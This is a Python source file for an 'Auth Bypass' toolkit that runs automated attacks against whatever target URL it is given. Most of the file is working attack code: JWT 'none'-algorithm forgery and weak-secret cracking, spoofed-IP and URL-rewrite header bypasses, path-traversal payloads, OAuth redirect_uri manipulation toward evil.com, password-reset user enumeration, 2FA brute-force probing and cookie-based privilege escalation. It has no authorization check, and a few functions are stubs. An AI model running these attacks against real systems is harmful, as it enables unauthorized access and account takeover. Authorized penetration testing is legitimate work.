#!/usr/bin/env python3
"""
Auth Bypass v1.0 - Authentication & Authorization Bypass Toolkit
Comprehensive testing for authentication and authorization vulnerabilities

Techniques:
1. JWT Attacks - None algorithm, weak secret, claim tampering
2. Session Attacks - Fixation, prediction, hijacking
3. OAuth Flaws - State bypass, redirect manipulation
4. Password Reset - Token prediction, user enumeration
5. 2FA Bypass - Rate limiting, backup codes, response manipulation
6. Header Injection - X-Forwarded-*, Host header
7. Path Traversal Auth - /../admin, /./admin
8. HTTP Method Override - GET to POST bypass
9. Cookie Manipulation - Flag tampering, value injection
10. Race Conditions - TOCTOU in auth flows

Author: Security Research Team
"""

import requests
import re
import json
import sys
import os
import jwt
import base64
import hashlib
import hmac
import time
import random
import string
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, quote
from collections import defaultdict
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
import urllib3
urllib3.disable_warnings()


class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    PURPLE = "\033[95m"
    CYAN = "\033[96m"
    BOLD = "\033[1m"
    END = "\033[0m"


@dataclass
class AuthBypassFinding:
    severity: str
    category: str
    title: str
    description: str
    technique: str
    evidence: str
    steps: List[str]
    impact: str


class AuthBypass:
    """
    Authentication and Authorization Bypass Toolkit
    """

    def __init__(self, target: str, output_dir: str = ".", verbose: bool = False):
        self.target = target.rstrip('/')
        self.output_dir = output_dir
        self.verbose = verbose

        self.session = requests.Session()
        self.session.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/json,*/*',
        }
        self.session.verify = False

        self.findings: List[AuthBypassFinding] = []

        # Common weak secrets for JWT
        self.weak_secrets = [
            'secret', 'password', '123456', 'admin', 'key', 'jwt_secret',
            'your-256-bit-secret', 'changeme', 'supersecret', 'secret123',
            'jwt', 'token', 'auth', 'private', 'HS256', 'test', 'development',
        ]

        # Protected paths to test
        self.protected_paths = [
            '/admin', '/dashboard', '/api/admin', '/api/users',
            '/settings', '/profile', '/account', '/internal',
            '/api/v1/admin', '/api/v1/users', '/management',
            '/console', '/debug', '/config', '/system',
        ]

    def log(self, level: str, msg: str):
        colors = {
            'info': Colors.BLUE,
            'success': Colors.GREEN,
            'warning': Colors.YELLOW,
            'error': Colors.RED,
            'finding': Colors.PURPLE,
            'bypass': Colors.GREEN + Colors.BOLD,
        }
        color = colors.get(level, '')
        print(f"{color}[{level.upper()}]{Colors.END} {msg}")

    def add_finding(self, severity: str, category: str, title: str,
                    description: str, technique: str, evidence: str,
                    steps: List[str], impact: str):
        finding = AuthBypassFinding(
            severity=severity,
            category=category,
            title=title,
            description=description,
            technique=technique,
            evidence=evidence[:500],
            steps=steps,
            impact=impact
        )
        self.findings.append(finding)
        self.log('finding', f"[{severity}] {title}")

    def run(self):
        """Run all auth bypass tests"""
        print(f"\n{Colors.BOLD}{'='*60}{Colors.END}")
        print(f"{Colors.PURPLE}   AUTH BYPASS TOOLKIT v1.0{Colors.END}")
        print(f"{Colors.BOLD}{'='*60}{Colors.END}")
        print(f"Target: {self.target}")
        print()

        # Phase 1: JWT Testing
        print(f"\n{Colors.CYAN}[PHASE 1] JWT ANALYSIS{Colors.END}")
        self._test_jwt_attacks()

        # Phase 2: Session Testing
        print(f"\n{Colors.CYAN}[PHASE 2] SESSION TESTING{Colors.END}")
        self._test_session_attacks()

        # Phase 3: Header Bypass
        print(f"\n{Colors.CYAN}[PHASE 3] HEADER BYPASS{Colors.END}")
        self._test_header_bypass()

        # Phase 4: Path Bypass
        print(f"\n{Colors.CYAN}[PHASE 4] PATH BYPASS{Colors.END}")
        self._test_path_bypass()

        # Phase 5: Method Override
        print(f"\n{Colors.CYAN}[PHASE 5] METHOD OVERRIDE{Colors.END}")
        self._test_method_override()

        # Phase 6: OAuth Testing
        print(f"\n{Colors.CYAN}[PHASE 6] OAUTH TESTING{Colors.END}")
        self._test_oauth_flaws()

        # Phase 7: Password Reset
        print(f"\n{Colors.CYAN}[PHASE 7] PASSWORD RESET{Colors.END}")
        self._test_password_reset()

        # Phase 8: 2FA Bypass
        print(f"\n{Colors.CYAN}[PHASE 8] 2FA BYPASS{Colors.END}")
        self._test_2fa_bypass()

        # Phase 9: Cookie Manipulation
        print(f"\n{Colors.CYAN}[PHASE 9] COOKIE MANIPULATION{Colors.END}")
        self._test_cookie_manipulation()

        # Phase 10: Race Conditions
        print(f"\n{Colors.CYAN}[PHASE 10] RACE CONDITIONS{Colors.END}")
        self._test_race_conditions()

        # Generate report
        self._generate_report()

    # ==================== JWT ATTACKS ====================

    def _test_jwt_attacks(self):
        """Test JWT vulnerabilities"""
        self.log('info', 'Testing JWT attacks...')

        # Try to find JWTs in responses
        try:
            resp = self.session.get(self.target, timeout=15)

            # Look for JWTs in cookies
            for cookie in self.session.cookies:
                if self._looks_like_jwt(cookie.value):
                    self.log('info', f'Found JWT in cookie: {cookie.name}')
                    self._analyze_jwt(cookie.value, f'cookie:{cookie.name}')

            # Look for JWTs in response
            jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
            for match in re.findall(jwt_pattern, resp.text):
                self.log('info', 'Found JWT in response')
                self._analyze_jwt(match, 'response_body')

        except Exception as e:
            self.log('warning', f'JWT discovery failed: {e}')

    def _looks_like_jwt(self, value: str) -> bool:
        """Check if string looks like a JWT"""
        parts = value.split('.')
        if len(parts) != 3:
            return False
        try:
            base64.urlsafe_b64decode(parts[0] + '==')
            base64.urlsafe_b64decode(parts[1] + '==')
            return True
        except:
            return False

    def _analyze_jwt(self, token: str, source: str):
        """Analyze JWT for vulnerabilities"""
        try:
            # Decode header and payload
            parts = token.split('.')
            header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))

            alg = header.get('alg', 'unknown')

            # Test 1: None algorithm
            self._test_jwt_none_alg(token, header, payload, source)

            # Test 2: Weak secret
            self._test_jwt_weak_secret(token, alg, source)

            # Test 3: Algorithm confusion
            self._test_jwt_alg_confusion(token, header, payload, source)

            # Test 4: Claim tampering
            self._test_jwt_claim_tampering(token, header, payload, source)

            # Test 5: Expired token acceptance
            self._test_jwt_expiry(token, payload, source)

        except Exception as e:
            if self.verbose:
                self.log('warning', f'JWT analysis failed: {e}')

    def _test_jwt_none_alg(self, token: str, header: Dict, payload: Dict, source: str):
        """Test none algorithm bypass"""
        # Create token with alg: none
        header['alg'] = 'none'
        new_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
        new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
        none_token = f'{new_header}.{new_payload}.'

        # Test the token
        if self._test_token(none_token, source):
            self.add_finding(
                severity='CRITICAL',
                category='jwt',
                title='JWT None Algorithm Bypass',
                description='Server accepts JWT tokens with alg: none',
                technique='jwt_none_alg',
                evidence=none_token[:100],
                steps=[
                    '1. Decode JWT token',
                    '2. Change header alg to "none"',
                    '3. Remove signature',
                    '4. Server accepts unsigned token',
                ],
                impact='Complete authentication bypass, token forgery'
            )

    def _test_jwt_weak_secret(self, token: str, alg: str, source: str):
        """Test for weak JWT secrets"""
        if alg not in ['HS256', 'HS384', 'HS512']:
            return

        for secret in self.weak_secrets:
            try:
                decoded = jwt.decode(token, secret, algorithms=[alg])
                self.add_finding(
                    severity='CRITICAL',
                    category='jwt',
                    title='Weak JWT Secret',
                    description=f'JWT signed with weak secret: {secret}',
                    technique='jwt_weak_secret',
                    evidence=f'Secret: {secret}',
                    steps=[
                        '1. Extract JWT from application',
                        f'2. Crack secret using wordlist (found: {secret})',
                        '3. Forge new tokens with arbitrary claims',
                    ],
                    impact='Token forgery, privilege escalation, impersonation'
                )
                break
            except jwt.InvalidSignatureError:
                continue
            except Exception:
                continue

    def _test_jwt_alg_confusion(self, token: str, header: Dict, payload: Dict, source: str):
        """Test algorithm confusion (RS256 to HS256)"""
        if header.get('alg') == 'RS256':
            # Try to use public key as HMAC secret (algorithm confusion)
            self.log('info', 'Testing RS256 -> HS256 algorithm confusion')
            # This requires the public key, which we would need to extract

    def _test_jwt_claim_tampering(self, token: str, header: Dict, payload: Dict, source: str):
        """Test claim tampering"""
        # Check for interesting claims to modify
        tampering_targets = ['role', 'admin', 'isAdmin', 'user_id', 'sub', 'email', 'permissions']

        for claim in tampering_targets:
            if claim in payload:
                original = payload[claim]
                self.log('info', f'Found modifiable claim: {claim} = {original}')

    def _test_jwt_expiry(self, token: str, payload: Dict, source: str):
        """Test expired token acceptance"""
        exp = payload.get('exp')
        if exp and exp < time.time():
            # Token is expired, test if it's still accepted
            if self._test_token(token, source):
                self.add_finding(
                    severity='HIGH',
                    category='jwt',
                    title='Expired JWT Accepted',
                    description='Server accepts expired JWT tokens',
                    technique='jwt_expiry',
                    evidence=f'Token expired at: {datetime.fromtimestamp(exp)}',
                    steps=[
                        '1. Obtain expired JWT token',
                        '2. Send request with expired token',
                        '3. Server accepts expired token',
                    ],
                    impact='Token reuse attacks, session extension'
                )

    def _test_token(self, token: str, source: str) -> bool:
        """Test if a JWT token is accepted"""
        try:
            headers = {'Authorization': f'Bearer {token}'}
            resp = self.session.get(f'{self.target}/api/me', headers=headers, timeout=10)
            return resp.status_code == 200
        except:
            return False

    # ==================== SESSION ATTACKS ====================

    def _test_session_attacks(self):
        """Test session-related vulnerabilities"""
        self.log('info', 'Testing session vulnerabilities...')

        # Get initial session
        try:
            resp = self.session.get(self.target, timeout=15)

            # Check session cookie properties
            for cookie in self.session.cookies:
                self._analyze_cookie_security(cookie)

            # Test session fixation
            self._test_session_fixation()

        except Exception as e:
            self.log('warning', f'Session testing failed: {e}')

    def _analyze_cookie_security(self, cookie):
        """Analyze cookie security attributes"""
        issues = []

        if not cookie.secure:
            issues.append('Missing Secure flag')
        if 'httponly' not in str(cookie._rest).lower():
            issues.append('Missing HttpOnly flag')
        if 'samesite' not in str(cookie._rest).lower():
            issues.append('Missing SameSite attribute')

        if issues:
            self.add_finding(
                severity='MEDIUM',
                category='session',
                title=f'Insecure Cookie: {cookie.name}',
                description=', '.join(issues),
                technique='cookie_analysis',
                evidence=f'Cookie: {cookie.name}',
                steps=[
                    f'1. Inspect cookie: {cookie.name}',
                    f'2. Issues found: {", ".join(issues)}',
                ],
                impact='Session hijacking, CSRF, XSS cookie theft'
            )

    def _test_session_fixation(self):
        """Test session fixation vulnerability"""
        # Get pre-auth session
        pre_auth_cookies = dict(self.session.cookies)

        # Simulate login (just visit login page)
        try:
            self.session.get(f'{self.target}/login', timeout=10)
            self.session.get(f'{self.target}/auth/signin', timeout=10)
        except:
            pass

        # Check if session ID changed
        post_auth_cookies = dict(self.session.cookies)

        for name in pre_auth_cookies:
            if name in post_auth_cookies:
                if pre_auth_cookies[name] == post_auth_cookies[name]:
                    self.log('warning', f'Session ID unchanged after auth flow: {name}')

    # ==================== HEADER BYPASS ====================

    def _test_header_bypass(self):
        """Test header-based authentication bypass"""
        self.log('info', 'Testing header bypass techniques...')

        bypass_headers = [
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Real-IP': '127.0.0.1'},
            {'X-Originating-IP': '127.0.0.1'},
            {'X-Remote-IP': '127.0.0.1'},
            {'X-Remote-Addr': '127.0.0.1'},
            {'X-Client-IP': '127.0.0.1'},
            {'X-Custom-IP-Authorization': '127.0.0.1'},
            {'X-Forwarded-Host': 'localhost'},
            {'X-Host': 'localhost'},
            {'X-Original-URL': '/admin'},
            {'X-Rewrite-URL': '/admin'},
            {'X-Override-URL': '/admin'},
        ]

        for path in self.protected_paths[:5]:
            url = f'{self.target}{path}'

            # Get baseline (should be 401/403)
            try:
                baseline = self.session.get(url, timeout=10)
                baseline_status = baseline.status_code
            except:
                continue

            if baseline_status not in [401, 403, 404]:
                continue  # Not protected

            # Try each bypass header
            for headers in bypass_headers:
                try:
                    resp = self.session.get(url, headers=headers, timeout=10)
                    if resp.status_code == 200:
                        header_name = list(headers.keys())[0]
                        self.add_finding(
                            severity='HIGH',
                            category='header_bypass',
                            title=f'Auth Bypass via {header_name}',
                            description=f'Protected path {path} accessible with header',
                            technique='header_injection',
                            evidence=f'{header_name}: {headers[header_name]}',
                            steps=[
                                f'1. Request {path} without headers (Status: {baseline_status})',
                                f'2. Add header: {header_name}: {headers[header_name]}',
                                f'3. Request returns 200 OK',
                            ],
                            impact='Authentication bypass, unauthorized access'
                        )
                        break
                except:
                    pass

    # ==================== PATH BYPASS ====================

    def _test_path_bypass(self):
        """Test path-based authentication bypass"""
        self.log('info', 'Testing path bypass techniques...')

        path_payloads = [
            '/..;/{}',
            '/.;/{}',
            '/;/{}',
            '/%2e%2e/{}'.format,
            '/%252e%252e/{}'.format,
            '/{}/',
            '/{}.json',
            '/{}%00',
            '/{}%0a',
            '/{}%0d%0a',
            '/{};',
            '/{}..;/',
            '/{}#',
            '/{}?',
            '//{}',
            '/./{}'.format,
        ]

        for base_path in self.protected_paths[:5]:
            path_without_slash = base_path.lstrip('/')

            for payload_func in path_payloads:
                try:
                    if callable(payload_func):
                        test_path = payload_func(path_without_slash)
                    else:
                        test_path = payload_func.format(path_without_slash)

                    url = f'{self.target}{test_path}'
                    resp = self.session.get(url, timeout=10, allow_redirects=False)

                    if resp.status_code == 200:
                        self.add_finding(
                            severity='HIGH',
                            category='path_bypass',
                            title='Path Traversal Auth Bypass',
                            description=f'Protected path accessible via path manipulation',
                            technique='path_traversal',
                            evidence=f'Path: {test_path}',
                            steps=[
                                f'1. Original path {base_path} is protected',
                                f'2. Modified path: {test_path}',
                                '3. Bypass grants access',
                            ],
                            impact='Authentication bypass, access to protected resources'
                        )
                        break
                except:
                    pass

    # ==================== METHOD OVERRIDE ====================

    def _test_method_override(self):
        """Test HTTP method override bypass"""
        self.log('info', 'Testing method override...')

        override_techniques = [
            ('X-HTTP-Method-Override', 'GET'),
            ('X-HTTP-Method', 'GET'),
            ('X-Method-Override', 'GET'),
            ('_method', 'GET'),  # As query param
        ]

        for path in self.protected_paths[:3]:
            url = f'{self.target}{path}'

            try:
                # POST with method override to GET
                for header, value in override_techniques:
                    if header == '_method':
                        resp = self.session.post(f'{url}?_method={value}', timeout=10)
                    else:
                        resp = self.session.post(url, headers={header: value}, timeout=10)

                    if resp.status_code == 200:
                        self.add_finding(
                            severity='MEDIUM',
                            category='method_override',
                            title='HTTP Method Override Bypass',
                            description=f'Auth bypass via {header}',
                            technique='method_override',
                            evidence=f'{header}: {value}',
                            steps=[
                                f'1. POST to {path} normally fails',
                                f'2. Add {header}: {value}',
                                '3. Request treated as GET, bypasses auth',
                            ],
                            impact='Authorization bypass via method confusion'
                        )
                        break
            except:
                pass

    # ==================== OAUTH TESTING ====================

    def _test_oauth_flaws(self):
        """Test OAuth implementation flaws"""
        self.log('info', 'Testing OAuth flaws...')

        oauth_endpoints = [
            '/oauth/authorize', '/auth/oauth', '/oauth/callback',
            '/api/auth/callback', '/login/oauth', '/connect/authorize',
        ]

        for endpoint in oauth_endpoints:
            # Test state parameter bypass
            try:
                url = f'{self.target}{endpoint}'
                params = {
                    'client_id': 'test',
                    'redirect_uri': f'{self.target}/callback',
                    'response_type': 'code',
                    # Missing state parameter
                }

                resp = self.session.get(url, params=params, timeout=10, allow_redirects=False)

                # Check if request proceeds without state
                if resp.status_code in [200, 302]:
                    if 'state' not in resp.text.lower():
                        self.log('warning', f'OAuth endpoint may not validate state: {endpoint}')

                # Test redirect_uri manipulation
                malicious_redirects = [
                    'https://evil.com/callback',
                    f'{self.target}.evil.com/callback',
                    f'{self.target}/callback@evil.com',
                    f'{self.target}/callback?next=https://evil.com',
                ]

                for redirect in malicious_redirects:
                    params['redirect_uri'] = redirect
                    resp = self.session.get(url, params=params, timeout=10, allow_redirects=False)

                    if resp.status_code == 302 and 'evil.com' in resp.headers.get('Location', ''):
                        self.add_finding(
                            severity='HIGH',
                            category='oauth',
                            title='OAuth Redirect URI Bypass',
                            description='OAuth allows redirect to attacker domain',
                            technique='oauth_redirect',
                            evidence=f'Redirect: {redirect}',
                            steps=[
                                '1. Initiate OAuth flow',
                                f'2. Set redirect_uri to: {redirect}',
                                '3. Code/token sent to attacker',
                            ],
                            impact='Account takeover via OAuth token theft'
                        )
                        break
            except:
                pass

    # ==================== PASSWORD RESET ====================

    def _test_password_reset(self):
        """Test password reset vulnerabilities"""
        self.log('info', 'Testing password reset flaws...')

        reset_endpoints = [
            '/forgot-password', '/reset-password', '/api/auth/forgot',
            '/api/reset-password', '/password/reset', '/account/recovery',
        ]

        for endpoint in reset_endpoints:
            try:
                url = f'{self.target}{endpoint}'
                resp = self.session.get(url, timeout=10)

                if resp.status_code == 200:
                    # Test user enumeration
                    test_emails = ['admin@test.com', 'nonexistent@test.com']
                    responses = []

                    for email in test_emails:
                        r = self.session.post(url, json={'email': email}, timeout=10)
                        responses.append({
                            'email': email,
                            'status': r.status_code,
                            'length': len(r.text),
                            'text': r.text[:100]
                        })

                    # Compare responses
                    if responses[0]['length'] != responses[1]['length'] or \
                       responses[0]['status'] != responses[1]['status']:
                        self.add_finding(
                            severity='LOW',
                            category='password_reset',
                            title='User Enumeration via Password Reset',
                            description='Different responses for valid/invalid emails',
                            technique='user_enumeration',
                            evidence=f'Length diff: {responses[0]["length"]} vs {responses[1]["length"]}',
                            steps=[
                                f'1. Submit valid email to {endpoint}',
                                '2. Submit invalid email',
                                '3. Compare response length/content',
                            ],
                            impact='Attacker can enumerate valid user accounts'
                        )
            except:
                pass

    # ==================== 2FA BYPASS ====================

    def _test_2fa_bypass(self):
        """Test 2FA bypass techniques"""
        self.log('info', 'Testing 2FA bypass...')

        # Common 2FA endpoints
        twofa_endpoints = [
            '/verify', '/2fa', '/mfa', '/otp', '/verify-otp',
            '/api/auth/verify', '/api/2fa/verify',
        ]

        for endpoint in twofa_endpoints:
            url = f'{self.target}{endpoint}'

            try:
                # Test rate limiting
                for i in range(10):
                    resp = self.session.post(url, json={'code': '000000'}, timeout=5)

                    if resp.status_code != 429:
                        if i == 9:
                            self.add_finding(
                                severity='MEDIUM',
                                category='2fa',
                                title='2FA Rate Limiting Missing',
                                description=f'No rate limit on {endpoint}',
                                technique='2fa_bruteforce',
                                evidence='10+ requests without rate limit',
                                steps=[
                                    f'1. Send OTP verification requests to {endpoint}',
                                    '2. No rate limiting observed',
                                    '3. Bruteforce possible (6 digit = 1M attempts)',
                                ],
                                impact='2FA bypass via brute force'
                            )

                # Test response manipulation (would need Burp/mitmproxy)
                self.log('info', f'2FA endpoint found: {endpoint}')

            except:
                pass

    # ==================== COOKIE MANIPULATION ====================

    def _test_cookie_manipulation(self):
        """Test cookie manipulation attacks"""
        self.log('info', 'Testing cookie manipulation...')

        # Get cookies
        try:
            resp = self.session.get(self.target, timeout=15)

            for cookie in self.session.cookies:
                # Test modifying cookie values
                original = cookie.value

                # Test role escalation
                if 'role' in cookie.name.lower() or 'user' in cookie.name.lower():
                    test_values = ['admin', 'administrator', 'root', '1', 'true']
                    for val in test_values:
                        self.session.cookies.set(cookie.name, val)
                        r = self.session.get(f'{self.target}/admin', timeout=10)
                        if r.status_code == 200:
                            self.add_finding(
                                severity='CRITICAL',
                                category='cookie',
                                title='Cookie-based Privilege Escalation',
                                description=f'Setting {cookie.name}={val} grants admin access',
                                technique='cookie_manipulation',
                                evidence=f'{cookie.name}={val}',
                                steps=[
                                    f'1. Change cookie {cookie.name} to {val}',
                                    '2. Access /admin',
                                    '3. Admin access granted',
                                ],
                                impact='Complete privilege escalation'
                            )
                            break
                    self.session.cookies.set(cookie.name, original)

        except Exception as e:
            if self.verbose:
                self.log('warning', f'Cookie testing failed: {e}')

    # ==================== RACE CONDITIONS ====================

    def _test_race_conditions(self):
        """Test race conditions in auth flows"""
        self.log('info', 'Testing race conditions...')

        # This would require concurrent requests
        # Using ThreadPoolExecutor

        def make_request(url):
            try:
                return self.session.get(url, timeout=5)
            except:
                return None

        # Test concurrent access to protected resource
        for path in self.protected_paths[:2]:
            url = f'{self.target}{path}'

            with ThreadPoolExecutor(max_workers=10) as executor:
                futures = [executor.submit(make_request, url) for _ in range(20)]
                results = [f.result() for f in as_completed(futures)]

            # Check for inconsistent responses
            status_codes = [r.status_code for r in results if r]
            if len(set(status_codes)) > 1:
                self.log('warning', f'Inconsistent responses for {path}: {set(status_codes)}')

    # ==================== REPORT GENERATION ====================

    def _generate_report(self):
        """Generate auth bypass report"""
        print(f"\n{Colors.BOLD}{'='*60}{Colors.END}")
        print(f"{Colors.PURPLE}   AUTH BYPASS RESULTS{Colors.END}")
        print(f"{Colors.BOLD}{'='*60}{Colors.END}")

        if not self.findings:
            print(f"\n{Colors.GREEN}No auth bypass vulnerabilities found.{Colors.END}")
        else:
            by_severity = defaultdict(list)
            for f in self.findings:
                by_severity[f.severity].append(f)

            print(f"\n{Colors.CYAN}Findings Summary:{Colors.END}")
            for sev in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']:
                if by_severity[sev]:
                    color = {'CRITICAL': Colors.RED + Colors.BOLD, 'HIGH': Colors.RED,
                             'MEDIUM': Colors.YELLOW, 'LOW': Colors.CYAN}.get(sev, '')
                    print(f"  {color}{sev}: {len(by_severity[sev])}{Colors.END}")

            print(f"\n{Colors.CYAN}Detailed Findings:{Colors.END}")
            for finding in self.findings:
                print(f"\n  {Colors.YELLOW}[{finding.severity}] {finding.title}{Colors.END}")
                print(f"    Category: {finding.category}")
                print(f"    Technique: {finding.technique}")
                print(f"    Impact: {finding.impact}")

        # Save report
        report = {
            'target': self.target,
            'timestamp': datetime.now().isoformat(),
            'findings': [
                {
                    'severity': f.severity,
                    'category': f.category,
                    'title': f.title,
                    'description': f.description,
                    'technique': f.technique,
                    'evidence': f.evidence,
                    'steps': f.steps,
                    'impact': f.impact,
                }
                for f in self.findings
            ]
        }

        report_dir = os.path.join(self.output_dir, 'auth_bypass_results')
        os.makedirs(report_dir, exist_ok=True)

        report_file = os.path.join(report_dir, 'auth_bypass_report.json')
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)

        print(f"\n{Colors.GREEN}Report saved: {report_file}{Colors.END}")


def main():
    if len(sys.argv) < 2:
        print("Usage: python auth_bypass.py <target_url> [-v]")
        print("\nExample:")
        print("  python auth_bypass.py https://example.com")
        print("  python auth_bypass.py https://example.com -v")
        sys.exit(1)

    target = sys.argv[1]
    verbose = '-v' in sys.argv or '--verbose' in sys.argv

    bypasser = AuthBypass(target, verbose=verbose)
    bypasser.run()


if __name__ == "__main__":
    main()
